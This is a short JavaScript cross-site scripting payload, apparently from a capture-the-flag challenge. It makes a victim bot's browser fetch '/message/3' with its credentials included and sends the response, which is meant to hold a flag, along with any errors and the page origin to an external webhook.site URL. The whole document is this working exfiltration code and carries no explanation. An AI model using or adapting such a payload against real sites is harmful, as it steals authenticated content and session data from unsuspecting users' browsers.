// fetch flag from 127.0.0.1 origin (bot view)
const W = 'https://webhook.site/97b90c33-9617-4d41-a1a2-d054deac91e4';
fetch(location.origin + '/message/3', {credentials:'include'})
  .then(r => r.text())
  .then(t => {
    navigator.sendBeacon(W + '?flag=' + encodeURIComponent(t));
    fetch(W + '?flag2=' + encodeURIComponent(t));
  })
  .catch(e => {
    fetch(W + '?err=' + encodeURIComponent(e.message));
  });
fetch(W + '?run=1&origin=' + encodeURIComponent(location.origin));
